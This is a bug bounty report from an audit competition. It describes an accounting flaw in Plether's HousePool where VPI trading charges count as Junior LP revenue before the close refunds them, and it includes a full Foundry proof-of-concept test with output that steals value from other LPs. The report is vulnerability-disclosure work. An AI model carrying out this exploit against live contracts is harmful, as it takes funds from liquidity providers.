# \#98895 [SC-Critical] A Junior LP withdraws a position's VPI charge as pool revenue before the close refunds it, and the remaining Junior LPs pay the refund

**Submitted on Nov 10th 2026 at 19:22:38 UTC by @gzeon for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98895
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A skew-increasing open pays a virtual price impact (VPI) charge that `CfdEngineSettlementSidecar` books into `HousePool` as cash revenue at once. The matching close gets that charge back as a rebate paid from pool cash. Nothing in the pool's NAV reserves the rebate while the position is open, so the hourly LP epoch settlement prices Junior exits on revenue the pool is about to refund. A Junior LP who also trades requests a redemption, opens a skew-increasing position near the skew cap, lets any keeper settle the epoch, claims, and then closes: the rebate is paid by whoever remains in the Junior tranche. At the release parameters and pool limits and a flat mark, the PoC raises the attacker's redemption by 3,886.42 USDG; after fees, bounty and carry, the attacker keeps 1,006.21 USDG per cycle, and the other Junior LP's share value is 2,445.27 USDG lower than without the trade, with no keeper race. In a 50,000,000 USDG pool the same cycle nets the attacker 6,457.89 USDG and costs the other Junior LPs 14,057.06 USDG.

## Vulnerability Details

Commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, `packages/perps/src`.

The VPI charge on an open is `C(post) - C(pre)` with `C(S) = vpiFactor * S^2 / (2 * D)` (`CfdMath.sol:118-140`, `S` the directional skew, `D` the pool's economic depth). `OpenAccountingLib.tryBuildOpenState` (`libraries/OpenAccountingLib.sol:135`) adds it to `tradeCostAssets`, and `CfdEngineSettlementSidecar.executeOpen` books the part that is not protocol fee into the pool as revenue the moment the order executes:

```solidity
// CfdEngineSettlementSidecar.sol:454-463
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool())
            .recordClaimantInflow(
                poolCashInflowAssets,
                IHousePool.ClaimantInflowKind.Revenue,
                IHousePool.ClaimantInflowCashMode.CashArrived
            );
    }
}
```

`recordClaimantInflow` adds the amount to `accountedAssets` (`HousePool.sol:641`), so pool backing rises by the charge immediately and the next reconcile recognises it as Junior revenue while Senior is unimpaired.

The close computes the opposite delta, clamps it so the trader never gets back more than the position accrued, and pays it from free pool cash; in the PoC the full close receives the accrued charge back net of its fee and carry (`libraries/CloseAccountingLib.sol:103-118`; `CfdEngineSettlementSidecar.sol:622` `IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets)`):

```solidity
// libraries/CloseAccountingLib.sol:112-118
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

The clamp protects the pool against a trader who wants more rebate than they paid, and its comment names the LP sandwich it is meant to stop: open, reduce pool depth, close. It limits the trader's lifetime VPI and reserves nothing on the LP side. Between the open and the close the charge sits in `accountedAssets` as if it were earned, and `settleLpEpoch` prices and funds Junior redemptions from `physicalAssets - traderClaimBalanceAssets + terminalLpPriceDeltaAssets` (`libraries/HousePoolAccountingLib.sol:60-78`), which carries no liability for the rebate the pool will owe when the position closes. `SECURITY.md:863` keeps VPI out of the pre-close price book and `:871-872` pays close-time rebates from free pool cash, so the realized open charge counts in full toward redemptions and the refund comes out of whatever cash remains.

Attack cycle, every call through the public entrypoints:

1. The attacker holds a fraction `f` of the Junior tranche and requests a redemption (`TrancheVault.requestRedeem`); it matures at the next hourly epoch.
2. At the epoch boundary the attacker opens a skew-increasing position through `OrderRouter.commitOrder` and `executeOrder`, paying `C(S)` into pool revenue. In the PoC `S = 3,600,000 USDG` against `D = 10,002,000 USDG` (36% of depth, inside the 40% cap), so the charge is 6,478.70 USDG; the open debits the trader 7,918.90 USDG in all, the charge plus the 1,440.00 USDG execution fee and the 0.20 USDG keeper bounty.
3. Any keeper calls `OrderRouter.settleLpEpoch`. The redemption is funded at a NAV that includes the 6,478.70 USDG; the attacker claims it (`claimRedeem`).
4. The attacker closes the position. The close credits the trader the 6,478.70 USDG rebate, and net of the close fee and carry the pool keeps, 5,038.69 USDG leaves the pool. The remaining Junior LPs, who no longer include the attacker's shares, absorb it.

The attacker's redemption has to fit inside the pool's free assets after the position's maximum liability is reserved (64% of depth after reserving the 36% position's maximum liability and the settlement buffer) and inside the Junior covenant, which keeps Senior at or under 80% of the pool after the exit. In the PoC the whole 3,000,000 USDG redemption is funded in one settlement and Senior ends at 71.4% of the pool. The position is held for the seconds between the open, the settlement and the close.

The open booking and the close rebate are unchanged on `Plether-Fi/plether-core` master (`6909f261`) and every other branch as of 2026-11-11.

## Impact Details

Impact in scope: `Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield` (Critical). The remaining Junior LP's share value ends each cycle below both its starting share value and a no-trade run of the same epoch sequence; the no-trade run has no trading revenue, so the loss comes out of principal. The attacker needs no price move and no ordering race, and the PoC repeats the cycle three times at a flat mark with a third-party keeper settling each epoch.

Measured in the PoC at the DEPLOYMENT.md release parameters (vpiFactor 0.01e18, maxSkewRatio 0.4e18, execution fee 4 bps) and release pool limits (80% Senior share, 40,000,000 USDG Senior cap). The pool holds a 5,000,000 USDG Senior tranche, a 2,000,000 USDG third-party Junior LP and a 3,000,000 USDG attacker Junior stake (60% of Junior). The attacker's position is 3,600,000 USDG at a 1.00 basket and a third-party keeper settles the epoch:

- Pool ledger: the open adds 6,478.70 USDG of VPI to `pool.totalAssets()` and 1,440.00 USDG of fee to the treasury; the keeper's settlement funds the attacker's redemption at 3,003,831.62 USDG and leaves Senior at 71.4% of the pool; the close removes 5,038.69 USDG from the pool (the 6,478.70 USDG rebate less the 1,440.00 USDG close fee and 0.01 USDG of carry the pool retains).
- Attacker: redemption 3,003,831.62 USDG versus 2,999,945.20 USDG with no trade, 3,886.42 USDG more, which matches `f * C(S)` at the attacker's 59.99% share of Junior; net profit of the cycle after both execution fees, the bounty and carry 1,006.21 USDG, before gas.
- Other Junior LP: share value 1,997,518.19 USDG versus 1,999,963.46 USDG with no trade, a loss of 2,445.27 USDG in the cycle.
- Against the control where the attacker closes before the settlement (same snapshot): the attacker's redemption is 3,020.12 USDG higher and their total value 3,024.31 USDG higher, and the other LP's share value is 3,022.80 USDG lower.
- Release scale, measured by the second test: 25,000,000 USDG Senior, 10,000,000 USDG third-party Junior, 15,000,000 USDG attacker Junior and a 19,000,000 USDG position (38% of depth). The charge is 36,098.56 USDG, the attacker's redemption is 21,658.15 USDG above the no-trade run, the attacker nets 6,457.89 USDG after fees, bounty and carry, the other Junior LPs lose 14,057.06 USDG in the cycle, and Senior again ends at 71.4%.
- Ignoring the bounty, carry and rounding, the attacker's take per cycle is `f * C(S)` and the cost is the two 4 bps fees on `S`. `C(S)` is `vpiFactor * (S / D) / 2` of `S`: 18 bps at 36% skew, 19 bps at 38% and 20 bps at the 40% cap, so the cycle nets `(18 * f - 8)`, `(19 * f - 8)` and `(20 * f - 8)` bps of `S`, positive for `f` above 44.4%, 42.1% and 40%. The charge is sized by total depth `D` (Senior included) while it accrues to the Junior tranche.
- Repetition, measured by the third test: the attacker re-deposits the redeemed assets, waits for activation and the one-hour cooldown, requests the next redemption and runs the cycle again. Each re-entry cycle takes 10,800 s (the re-deposit activates at epoch E, its one-hour cooldown ends past the request cutoff of E + 1, and the redemption settles at E + 2). After three cycles the attacker's total value is 3,028.69 USDG above a no-trade run of the same epoch sequence and the other Junior LP's share value is 7,345.64 USDG below it, with the per-cycle charge at 6,478.70, 6,477.77 and 6,476.84 USDG as re-invested redemptions and retained close fees slightly raise pool depth.

## References

- `packages/perps/src/CfdEngineSettlementSidecar.sol:454-463` (open books `tradeCost - protocolFee` as `ClaimantInflowKind.Revenue`), `:622` (close pays `actionRebatePaidAssets` from the pool)
- `packages/perps/src/HousePool.sol:630-650` (`recordClaimantInflow` adds to `accountedAssets`)
- `packages/perps/src/libraries/CloseAccountingLib.sol:103-118` (rebate and the trader-side lifetime clamp)
- `packages/perps/src/libraries/HousePoolAccountingLib.sol:60-78` (settlement NAV has no rebate liability)
- `packages/perps/src/CfdMath.sol:118-140` (`C(S) = vpiFactor * S^2 / (2 * D)`)
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol:549-582` (permissionless `settleLpEpoch`)
- `packages/perps/SECURITY.md:862-875` (NAV composition; anticipated VPI excluded, realized charges not reserved)

## Proof of Concept

## Proof of Concept

Runs in the repository's Foundry suite at `a82d4fefb02768e5b3bddcc97dee371eee24fea8` with no change to any in-scope contract. Test assistance, all from the repository's own fixtures: `AtomicLpEpochSettlementTestFixture` seeds the tranches through the pool's own settlement path before the attack and `_fundTrader` funds the attacker's trading account. The release pool limits (`proposePoolConfig`, `finalizePoolConfig`) and risk parameters (`_setRiskParams`) are applied through the owner's 72-hour timelocks. `MockSettlementToken` stands in for USDG, `MockPyth` with a zero update fee serves synthetic ticks, and `vm.warp`, `vm.roll`, `vm.prank` and `vm.snapshotState` sequence the scenarios from one state. Every attack step uses the public `OrderRouter` and `TrancheVault` entrypoints, and a third-party keeper settles every epoch. The first test measures one cycle against a no-trade baseline and a close-first control from the same snapshot, the second repeats it in a 50,000,000 USDG pool, and the third runs three consecutive cycles against a no-trade run of the same epoch sequence. Save the file as `packages/perps/test/perps/PoCVpiRevenueTiming.t.sol` and run:

```
cd packages/perps
FOUNDRY_VIA_IR=false FOUNDRY_OUT=out-ci-fast FOUNDRY_CACHE_PATH=cache-ci-fast forge test --offline --match-path 'test/perps/PoCVpiRevenueTiming.t.sol' --skip script -vv
```

The default via-IR profile gives the same numbers. Output:

```
Ran 3 tests for test/perps/PoCVpiRevenueTiming.t.sol:PoCVpiRevenueTiming
[PASS] test_PoC_redeemerExitsBetweenVpiChargeAndRebate() (gas: 12276756)
  pool depth before the open (USDG atoms) 10002000000000
  A0 before the open
    pool.totalAssets 10002000000000
    juniorPrincipal 5000999315058
    seniorPrincipal 5001000684942
    maxSeniorShareBps / seniorRateBps 8000 800
    pendingTradingRevenueAssets 0
    treasury balance 0
    attacker trader balance 400000000000
  VPI charged on the skew-increasing open (USDG atoms) 6478704259
  A1 after the open: VPI charge in pool revenue, fee in treasury
    pool.totalAssets 10008478704259
    juniorPrincipal 5000999315058
    seniorPrincipal 5001000684942
    maxSeniorShareBps / seniorRateBps 8000 800
    pendingTradingRevenueAssets 0
    treasury balance 1440000000
    attacker trader balance 392081095741
  A2 after a third-party keeper settles the epoch
    pool.totalAssets 7004647081316
    juniorPrincipal 2003555015837
    seniorPrincipal 5001092065479
    maxSeniorShareBps / seniorRateBps 8000 800
    pendingTradingRevenueAssets 0
    treasury balance 1440000000
    attacker trader balance 392081095741
  A3 after the attacker claims the redemption
    pool.totalAssets 7004647081316
    juniorPrincipal 2003555015837
    seniorPrincipal 5001092065479
    maxSeniorShareBps / seniorRateBps 8000 800
    pendingTradingRevenueAssets 0
    treasury balance 1440000000
    attacker trader balance 392081095741
  senior share of the pool after the exit (bps) 7139
  A4 after the close: rebate paid by the pool
    pool.totalAssets 6999608388780
    juniorPrincipal 2003555015837
    seniorPrincipal 5001092065479
    maxSeniorShareBps / seniorRateBps 8000 800
    pendingTradingRevenueAssets 0
    treasury balance 1440000000
    attacker trader balance 397119788277
  VPI charged on the skew-increasing open (USDG atoms) 6478704259
  C no-trade: attacker redemption 2999945199982
  C no-trade: victim share value 1999963457523
  A attack: attacker redemption 3003831622943
  A attack: attacker trader balance 397119788277
  A attack: victim share value 1997518191983
  B control: attacker redemption 3000811500811
  B control: attacker trader balance 397115600596
  B control: victim share value 2000540991405
  attacker LP gain from timing (A-B) 3020122132
  victim loss from timing (B-A) 3022799422
  attacker net profit of the cycle vs no trade (A-C, fees included) 1006211238
  victim loss vs no trade (C-A) 2445265540
[PASS] test_PoC_releaseScale() (gas: 12200120)
  pool depth before the open (USDG atoms) 50002000000000
  VPI charged on the skew-increasing open (USDG atoms) 36098556057
  senior share of the pool after the exit (bps) 7139
  VPI charged on the skew-increasing open (USDG atoms) 36098556057
  C no-trade: attacker redemption 14999726021900
  C no-trade: victim share value 9999817338796
  A attack: attacker redemption 15021384175633
  A attack: attacker trader balance 1484799734657
  A attack: victim share value 9985760274640
  B control: attacker redemption 15004301254777
  B control: attacker trader balance 1484773726529
  B control: victim share value 10002867494045
  attacker LP gain from timing (A-B) 17082920856
  victim loss from timing (B-A) 17107219405
  attacker net profit of the cycle vs no trade (A-C, fees included) 6457888390
  victim loss vs no trade (C-A) 14057064156
[PASS] test_PoC_threeCycles() (gas: 19826417)
  victim share value at start 1999963457522
  baseline (no trade) after three cycles: attacker total 3399835559244
  baseline (no trade) after three cycles: victim share value 1999799091781
  VPI charged on the skew-increasing open (USDG atoms) 6478704259
  cycle 1
    attacker redeemed 3003831622943
    attacker trader balance 397119788277
    victim share value 1997518191983
    senior share of the pool (bps) 7139
    seconds since start 277206
  VPI charged on the skew-increasing open (USDG atoms) 6477771638
  cycle 2
    attacker redeemed 3007666584292
    attacker trader balance 394239576551
    victim share value 1994987489813
    senior share of the pool (bps) 7142
    seconds since start 288006
  VPI charged on the skew-increasing open (USDG atoms) 6476839287
  cycle 3
    attacker redeemed 3011504879815
    attacker trader balance 391359364822
    victim share value 1992453451385
    senior share of the pool (bps) 7144
    seconds since start 298806
  attacker total after three cycles vs start 2864244637
  attacker total after three cycles vs no-trade baseline 3028685393
  victim share value loss after three cycles vs start 7510006137
  victim share value loss after three cycles vs no-trade baseline 7345640396
Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 29.70ms (50.13ms CPU time)
```

Test file:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {AtomicLpEpochSettlementTestFixture} from "./shared/AtomicLpEpochSettlementFixture.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice PoC: the VPI charge of a skew-increasing open is booked as LP revenue at once, while the rebate the pool
///         owes on the matching close is not reserved in the NAV. A Junior LP who is also the trader opens, settles
///         the epoch that funds their own redemption, and only then closes: the rebate is paid by the remaining LP.
///         Public Router entrypoints only, pin a82d4fef, no in-scope contract modified.
contract PoCVpiRevenueTiming is AtomicLpEpochSettlementTestFixture {

    uint256 internal constant P0 = 100_000_000;
    /// @dev Scenario sizes, set by each test before `_stage()`. The base pool is 10,000,000 USDG (5,000,000 Senior,
    ///      2,000,000 third-party Junior, 3,000,000 attacker Junior = 60% of Junior); the release-scale pool is
    ///      50,000,000 USDG (25,000,000 Senior, 10,000,000 third-party Junior, 15,000,000 attacker Junior).
    uint256 internal seniorSeed;
    uint256 internal victimSeed;
    uint256 internal attackerSeed;
    uint256 internal size;
    uint256 internal margin;
    uint256 internal funding;
    bool internal logLedger; // per-step pool ledger, printed for the base cycle only
    uint256 internal clientNonce; // client ids are permanent per account

    function _baseParams() internal {
        seniorSeed = 5_000_000e6;
        victimSeed = 2_000_000e6;
        attackerSeed = 3_000_000e6;
        size = 3.6e24; // 36,000 lots = 3,600,000 USDG notional at 1.00, 36% of the 10,000,000 USDG depth
        margin = 180_000e6; // 5%
        funding = 400_000e6;
    }

    function _releaseScaleParams() internal {
        seniorSeed = 25_000_000e6;
        victimSeed = 10_000_000e6;
        attackerSeed = 15_000_000e6;
        size = 1.9e25; // 190,000 lots = 19,000,000 USDG notional at 1.00, 38% of the 50,000,000 USDG depth
        margin = 950_000e6; // 5%
        funding = 1_500_000e6;
    }

    /// @dev DEPLOYMENT.md release limits through the owner's timelocked paths: the pool config (40,000,000 USDG Senior
    ///      cap, 80% Senior share) and the engine risk config are proposed together and finalized after one 72-hour
    ///      delay. The attacker's exit must leave Senior at or under 80% of the pool (Junior covenant).
    function _applyReleaseConfig() internal {
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorExposureAssets = 40_000_000e6;
        config.maxSeniorShareBps = 8_000;
        pool.proposePoolConfig(config);
        _applyReleaseRiskParams(); // proposes the risk config, warps 72 hours + 1 second, finalizes it
        assertGe(vm.getBlockTimestamp(), pool.poolConfigActivationTime(), "pool timelock elapsed");
        pool.finalizePoolConfig();
        assertEq(pool.maxSeniorShareBps(), 8_000, "release Senior share");
    }

    function _applyReleaseRiskParams() internal {
        _setRiskParams(
            CfdTypes.RiskParams({
                vpiFactor: 0.01e18,
                maxSkewRatio: 0.4e18,
                maintMarginBps: 10,
                initMarginBps: 20,
                fadMarginBps: 300,
                baseCarryBps: 500,
                minBountyAssets: 1e6,
                bountyBps: 10,
                keeperShareBps: 5000,
                protocolShareBps: 0
            })
        );
    }

    function _ticks(uint256 price, uint256 publishTime) internal view returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory t = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            t[i] = MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, publishTime, 0));
        }
        data = new bytes[](1);
        data[0] = abi.encode(t);
    }

    function _advance(uint256 seconds_) internal {
        vm.warp(vm.getBlockTimestamp() + seconds_);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _request(bytes32 clientId, bool isClose, uint256 targetPrice, uint256 marginDelta)
        internal
        view
        returns (OrderV3Types.OrderRequest memory request)
    {
        request.clientOrderId = clientId;
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = size;
        request.marginDelta = marginDelta;
        request.targetPrice = targetPrice;
        request.isClose = isClose;
        request.bounds.submitBy = uint64(vm.getBlockTimestamp() + 60);
        request.bounds.executionWindowSeconds = 60;
        request.bounds.allowedExecutionModes = 7;
        request.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        request.bounds.maxExecutionBountyAssets = type(uint256).max;
        request.bounds.maxExecutionNotionalAssets = type(uint256).max;
        request.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        request.bounds.maxActionChargeAssets = type(uint256).max;
        request.bounds.maxExplicitFeesAssets = type(uint256).max;
        request.bounds.maxPostPositionSize = type(uint256).max;
        request.bounds.maxPostLeverageBps = type(uint32).max;
    }

    struct Outcome {
        uint256 attackerRedemption;
        uint256 victimShareValue;
        uint256 attackerTraderBalance;
    }

    function _stage() internal returns (uint256 redeemId, uint256 aliceShares) {
        _applyReleaseConfig();
        aliceShares = _seedJuniorLp(ALICE, victimSeed);
        uint256 bobShares = _seedJuniorLp(BOB, attackerSeed);
        _fundSenior(CAROL, seniorSeed);
        vm.warp(block.timestamp + 1 hours + 1);
        vm.roll(block.number + 1);
        baseMockPyth.setFee(0);
        redeemId = _requestJuniorRedeem(BOB, bobShares);
        _warpToEpoch(redeemId);
        vm.roll(block.number + 1);
        router.updateMarkPrice(_ticks(P0, vm.getBlockTimestamp()));
        _fundTrader(BOB, funding);
    }

    function _open() internal {
        OrderV3Types.OrderRequest memory open = _request(bytes32(uint256(0x0B0B0000) + clientNonce++), false, 0.99e8, margin);
        vm.prank(BOB);
        uint64 openId = router.commitOrder(open);
        OrderV3Types.ExecutionResult memory res = router.executeOrder(openId, _mockPythUpdateData(P0));
        assertEq(uint8(res.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open executed");
        (,,,,,, int256 vpiAccrued) = engine.positions(BOB);
        console2.log("VPI charged on the skew-increasing open (USDG atoms)", uint256(vpiAccrued));
    }

    function _close() internal {
        OrderV3Types.OrderRequest memory close = _request(bytes32(uint256(0x0B0B0000) + clientNonce++), true, 2e8, 0);
        vm.prank(BOB);
        uint64 closeId = router.commitOrder(close);
        OrderV3Types.ExecutionResult memory res = router.executeOrder(closeId, _mockPythUpdateData(P0));
        assertEq(uint8(res.status), uint8(OrderV3Types.LifecycleStatus.Executed), "close executed");
        (uint256 size,,,,,,) = engine.positions(BOB);
        assertEq(size, 0, "flat");
    }

    /// @dev Any keeper may settle; the attacker only needs their position to straddle the settlement.
    function _settle() internal {
        vm.prank(CAROL);
        router.settleLpEpoch(_ticks(P0, vm.getBlockTimestamp()));
    }

    function _ledger(string memory label) internal view {
        if (!logLedger) return;
        console2.log(label);
        console2.log("  pool.totalAssets", pool.totalAssets());
        console2.log("  juniorPrincipal", pool.juniorPrincipal());
        console2.log("  seniorPrincipal", pool.seniorPrincipal());
        console2.log("  maxSeniorShareBps / seniorRateBps", pool.maxSeniorShareBps(), pool.seniorRateBps());
        console2.log("  pendingTradingRevenueAssets", pool.pendingTradingRevenueAssets());
        console2.log("  treasury balance", clearinghouse.balanceAssets(engine.protocolTreasury()));
        console2.log("  attacker trader balance", clearinghouse.balanceAssets(BOB));
    }

    function _outcome(uint256 redeemId, uint256 aliceShares) internal returns (Outcome memory o) {
        uint256 claimable = juniorVault.claimableRedeemRequest(redeemId, BOB);
        assertGt(claimable, 0, "redemption funded");
        vm.prank(BOB);
        o.attackerRedemption = juniorVault.claimRedeem(redeemId, claimable, BOB, BOB);
        o.victimShareValue = juniorVault.estimateRedeemAssets(aliceShares);
        o.attackerTraderBalance = clearinghouse.balanceAssets(BOB);
    }


    /// @dev Re-deposit the redeemed assets, wait for activation and the cooldown, and request the next redemption.
    function _reenter(uint256 assets) internal returns (uint256 redeemId) {
        uint256 depositId = _requestJuniorDeposit(BOB, assets);
        _warpToEpoch(depositId);
        vm.roll(block.number + 1);
        _settle(); // a keeper settles the epoch that activates the deposit (no position is open)
        uint256 shares = _claimJuniorDeposit(depositId, BOB);
        vm.warp(block.timestamp + 1 hours + 1); // deposit cooldown
        vm.roll(block.number + 1);
        redeemId = _requestJuniorRedeem(BOB, shares);
        _warpToEpoch(redeemId);
        vm.roll(block.number + 1);
        router.updateMarkPrice(_ticks(P0, vm.getBlockTimestamp()));
    }

    /// @dev Three consecutive cycles at a flat mark: open near the cap, keeper settles the matured redemption,
    ///      claim, close, re-enter. A no-trade baseline runs the same epoch sequence (settle, claim, re-enter) from the
    ///      same snapshot so the remaining Junior LP's loss excludes coupon drift.
    function test_PoC_threeCycles() public {
        _baseParams();
        (uint256 redeemId, uint256 aliceShares) = _stage();
        uint256 victimStart = juniorVault.estimateRedeemAssets(aliceShares);
        uint256 attackerStart = attackerSeed + funding;
        console2.log("victim share value at start", victimStart);
        uint256 snap = vm.snapshotState();

        // baseline: the same three settle-claim-re-enter cycles with no trade
        uint256 baseRedeemId = redeemId;
        uint256 baseRedeemed;
        for (uint256 cycle = 1; cycle <= 3; ++cycle) {
            _advance(2);
            _settle();
            uint256 claimable = juniorVault.claimableRedeemRequest(baseRedeemId, BOB);
            vm.prank(BOB);
            baseRedeemed = juniorVault.claimRedeem(baseRedeemId, claimable, BOB, BOB);
            _advance(2);
            if (cycle < 3) {
                baseRedeemId = _reenter(baseRedeemed);
            }
        }
        uint256 victimBaseline = juniorVault.estimateRedeemAssets(aliceShares);
        uint256 attackerBaseline = baseRedeemed + clearinghouse.balanceAssets(BOB);
        console2.log("baseline (no trade) after three cycles: attacker total", attackerBaseline);
        console2.log("baseline (no trade) after three cycles: victim share value", victimBaseline);
        vm.revertToState(snap);

        for (uint256 cycle = 1; cycle <= 3; ++cycle) {
            _open();
            _advance(2);
            _settle();
            uint256 claimable = juniorVault.claimableRedeemRequest(redeemId, BOB);
            vm.prank(BOB);
            uint256 redeemed = juniorVault.claimRedeem(redeemId, claimable, BOB, BOB);
            _advance(2);
            _close();
            console2.log("cycle", cycle);
            console2.log("  attacker redeemed", redeemed);
            console2.log("  attacker trader balance", clearinghouse.balanceAssets(BOB));
            console2.log("  victim share value", juniorVault.estimateRedeemAssets(aliceShares));
            console2.log("  senior share of the pool (bps)", pool.seniorPrincipal() * 10_000 / (pool.seniorPrincipal() + pool.juniorPrincipal()));
            console2.log("  seconds since start", vm.getBlockTimestamp() - SETUP_TIMESTAMP);
            if (cycle < 3) {
                redeemId = _reenter(redeemed);
            } else {
                uint256 attackerEnd = redeemed + clearinghouse.balanceAssets(BOB);
                uint256 victimEnd = juniorVault.estimateRedeemAssets(aliceShares);
                console2.log("attacker total after three cycles vs start", attackerEnd - attackerStart);
                console2.log("attacker total after three cycles vs no-trade baseline", attackerEnd - attackerBaseline);
                console2.log("victim share value loss after three cycles vs start", victimStart - victimEnd);
                console2.log("victim share value loss after three cycles vs no-trade baseline", victimBaseline - victimEnd);
                assertGt(attackerEnd, attackerBaseline, "three cycles net positive after fees");
                assertLt(victimEnd, victimBaseline, "victim loses every cycle");
            }
        }
    }

    function test_PoC_redeemerExitsBetweenVpiChargeAndRebate() public {
        _baseParams();
        logLedger = true;
        _runSingleCycle();
    }

    /// @notice Same cycle in a 50,000,000 USDG pool at the release limits: 25,000,000 Senior, 10,000,000 third-party
    ///         Junior, 15,000,000 attacker Junior, a 19,000,000 USDG position (38% of depth).
    function test_PoC_releaseScale() public {
        _releaseScaleParams();
        _runSingleCycle();
    }

    function _runSingleCycle() internal {
        (uint256 redeemId, uint256 aliceShares) = _stage();
        console2.log("pool depth before the open (USDG atoms)", pool.totalAssets());
        uint256 snap = vm.snapshotState();

        // C (baseline): no trade; the attacker simply settles and claims.
        _settle();
        Outcome memory c = _outcome(redeemId, aliceShares);
        vm.revertToState(snap);

        // A (attack): open near the skew cap (VPI booked as revenue), a keeper settles, the attacker claims, then closes
        //    (the rebate is paid from pool cash).
        _ledger("A0 before the open");
        _open();
        _ledger("A1 after the open: VPI charge in pool revenue, fee in treasury");
        _advance(2);
        _settle();
        _ledger("A2 after a third-party keeper settles the epoch");
        Outcome memory a;
        a.attackerRedemption = _outcome(redeemId, aliceShares).attackerRedemption;
        _ledger("A3 after the attacker claims the redemption");
        console2.log("senior share of the pool after the exit (bps)", pool.seniorPrincipal() * 10_000 / (pool.seniorPrincipal() + pool.juniorPrincipal()));
        _advance(2);
        _close();
        _ledger("A4 after the close: rebate paid by the pool");
        a.victimShareValue = juniorVault.estimateRedeemAssets(aliceShares);
        a.attackerTraderBalance = clearinghouse.balanceAssets(BOB);
        vm.revertToState(snap);

        // B (control): open and close before the epoch settles, then settle and claim.
        _open();
        _advance(2);
        _close();
        _advance(2);
        _settle();
        Outcome memory b = _outcome(redeemId, aliceShares);

        console2.log("C no-trade: attacker redemption", c.attackerRedemption);
        console2.log("C no-trade: victim share value", c.victimShareValue);
        console2.log("A attack: attacker redemption", a.attackerRedemption);
        console2.log("A attack: attacker trader balance", a.attackerTraderBalance);
        console2.log("A attack: victim share value", a.victimShareValue);
        console2.log("B control: attacker redemption", b.attackerRedemption);
        console2.log("B control: attacker trader balance", b.attackerTraderBalance);
        console2.log("B control: victim share value", b.victimShareValue);
        uint256 totalA = a.attackerRedemption + a.attackerTraderBalance;
        uint256 totalC = c.attackerRedemption + funding;
        console2.log("attacker LP gain from timing (A-B)", a.attackerRedemption - b.attackerRedemption);
        console2.log("victim loss from timing (B-A)", b.victimShareValue - a.victimShareValue);
        console2.log("attacker net profit of the cycle vs no trade (A-C, fees included)", totalA - totalC);
        console2.log("victim loss vs no trade (C-A)", c.victimShareValue - a.victimShareValue);
        assertGt(a.attackerRedemption, b.attackerRedemption, "timing pays the redeemer");
        assertLt(a.victimShareValue, b.victimShareValue, "remaining LP bears the rebate");
        assertGt(totalA, totalC, "cycle is net positive after fees");
    }

}
```
